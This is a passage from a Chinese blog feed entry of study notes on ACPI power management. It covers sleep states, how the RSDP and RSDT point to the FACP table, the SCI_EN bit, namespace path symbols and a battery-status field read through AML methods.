每一睡眠状态都指定:谁负责保持系统上下文，谁负责唤醒序列。</h3><h3 id="10、-当OS既支持传统又支持ACPI时，启动首先进入传统模式然后再由操作系统转为ACPI模式。"><a href="#10、-当OS既支持传统又支持ACPI时，启动首先进入传统模式然后再由操作系统转为ACPI模式。" class="headerlink" title="10、 当OS既支持传统又支持ACPI时，启动首先进入传统模式然后再由操作系统转为ACPI模式。"></a>10、 当OS既支持传统又支持ACPI时，启动首先进入传统模式然后再由操作系统转为ACPI模式。</h3><h3 id="11、-R00T-SYSTEM-DESCRIPTION-PONITER结构位于系统的内存空间，由BIOS建立，这个结构中有ROOT-SYSTEM-DESCRIPTION-TABLE的地址，RSDT表中有指向其他表的指针，这些表向操作系统提供了基本系统实现和配置信息。RSDT中的指针指向内存中的其他表。RSDT的地址由RSDP提供，而RSDP保存在Extended-BIOS-Data-Area-EBDA-or-in-the-BIOS-read-only-memory-space，OSPM只有通过搜索特定魔数即”RSD-PTR-“字符串来确定RSDP，RSDT总是第一个表，它指向FACP-FIXED-ACPI-TABLE-，FACP表包括许多描述硬件FIXED-ACPI特性的固定长度的入口。"><a href="#11、-R00T-SYSTEM-DESCRIPTION-PONITER结构位于系统的内存空间，由BIOS建立，这个结构中有ROOT-SYSTEM-DESCRIPTION-TABLE的地址，RSDT表中有指向其他表的指针，这些表向操作系统提供了基本系统实现和配置信息。RSDT中的指针指向内存中的其他表。RSDT的地址由RSDP提供，而RSDP保存在Extended-BIOS-Data-Area-EBDA-or-in-the-BIOS-read-only-memory-space，OSPM只有通过搜索特定魔数即”RSD-PTR-“字符串来确定RSDP，RSDT总是第一个表，它指向FACP-FIXED-ACPI-TABLE-，FACP表包括许多描述硬件FIXED-ACPI特性的固定长度的入口。" class="headerlink" title="11、 R00T SYSTEM DESCRIPTION PONITER结构位于系统的内存空间，由BIOS建立，这个结构中有ROOT SYSTEM DESCRIPTION TABLE的地址，RSDT表中有指向其他表的指针，这些表向操作系统提供了基本系统实现和配置信息。RSDT中的指针指向内存中的其他表。RSDT的地址由RSDP提供，而RSDP保存在Extended BIOS Data Area (EBDA), or in the BIOS read-only memory space，OSPM只有通过搜索特定魔数即”RSD PTR “字符串来确定RSDP，RSDT总是第一个表，它指向FACP(FIXED ACPI TABLE)，FACP表包括许多描述硬件FIXED ACPI特性的固定长度的入口。"></a>11、 R00T SYSTEM DESCRIPTION PONITER结构位于系统的内存空间，由BIOS建立，这个结构中有ROOT SYSTEM DESCRIPTION TABLE的地址，RSDT表中有指向其他表的指针，这些表向操作系统提供了基本系统实现和配置信息。RSDT中的指针指向内存中的其他表。RSDT的地址由RSDP提供，而RSDP保存在Extended BIOS Data Area (EBDA), or in the BIOS read-only memory space，OSPM只有通过搜索特定魔数即”RSD PTR “字符串来确定RSDP，RSDT总是第一个表，它指向FACP(FIXED ACPI TABLE)，FACP表包括许多描述硬件FIXED ACPI特性的固定长度的入口。</h3><p><img src="http://static.oschina.net/uploads/img/201301/10220955_B2bv.jpg" alt="clip_image011[6]"><br><img src="http://static.oschina.net/uploads/img/201301/10220957_X1GX.jpg" alt="clip_image013[6]"></p><h3 id="12、SCI-EN决定了中断是由SMI处理还是SCI来处理。"><a href="#12、SCI-EN决定了中断是由SMI处理还是SCI来处理。" class="headerlink" title="12、SCI_EN决定了中断是由SMI处理还是SCI来处理。"></a>12、SCI_EN决定了中断是由SMI处理还是SCI来处理。</h3><p><img src="http://static.oschina.net/uploads/img/201301/10220958_aFdV.jpg" alt="clip_image015[6]"></p><h3 id="13、-“-”代表父路径，“-”代表根路径root，“-”路径分割符。"><a href="#13、-“-”代表父路径，“-”代表根路径root，“-”路径分割符。" class="headerlink" title="13、 “^”代表父路径，“\”代表根路径root，“.”路径分割符。"></a>13、 “^”代表父路径，“\”代表根路径root，“.”路径分割符。</h3><h3 id="14、-BNUM-：0x7F2EBC46-最后一位决定电池是否存在，B1ST第三位决定。然而要刷新BNUM必须首先执行Method-REG-2-NotSerialized-或者Method-Q33-0-NotSerialized-才可以。目前亟需要弄清楚这些方法是如何调用的，什么时候调用的。"><a href="#14、-BNUM-：0x7F2EBC46-最后一位决定电池是否存在，B1ST第三位决定。然而要刷新BNUM必须首先执行Method-REG-2-NotSerialized-或者Method-Q33-0-NotSerialized-才可以。目前亟需要弄清楚这些方法是如何调用的，什么时候调用的。" class="headerlink" title="14、 BNUM ：0x7F2EBC46,最后一位决定电池是否存在，B1ST第三位决定。然而要刷新BNUM必须首先执行Method (_REG, 2, NotSerialized)或者Method (_Q33, 0, NotSerialized)才可以。目前亟需要弄清楚这些方法是如何调用的，什么时候调用的。"></a>14、 <code>BNUM ：0x7F2EBC46</code>,最后一位决定电池是否存在，B1ST第三位决定。然而要刷新BNUM必须首先执行<code>Method (_REG, 2, NotSerialized)</code>或者<code>Method (_Q33, 0, NotSerialized)</code>才可以。目前亟需要弄清楚这些方法是如何调用的，什么时候调用的。</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、-ACPI主要包含以下几个部分：&quot;&gt;&lt;a href=&quot;#1、-ACPI主要包含以下几个部分：&quot; class=&quot;headerlink&quot; title=&quot;1、 ACPI主要包含以下几个部分：&quot;&gt;&lt;/a&gt;1、 ACPI主要包含以下几个部分：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
      
    
    </summary>
    
      <category term="电源管理" scheme="https://fengguoqing.github.io/categories/%E7%94%B5%E6%BA%90%E7%AE%A1%E7%90%86/"/>
    
    
      <category term="功耗" scheme="https://fengguoqing.github.io/tags/%E5%8A%9F%E8%80%97/"/>
    
      <category term="ACPI" scheme="https://fengguoqing.github.io/tags/ACPI/"/>
    
  </entry>
  
</feed>
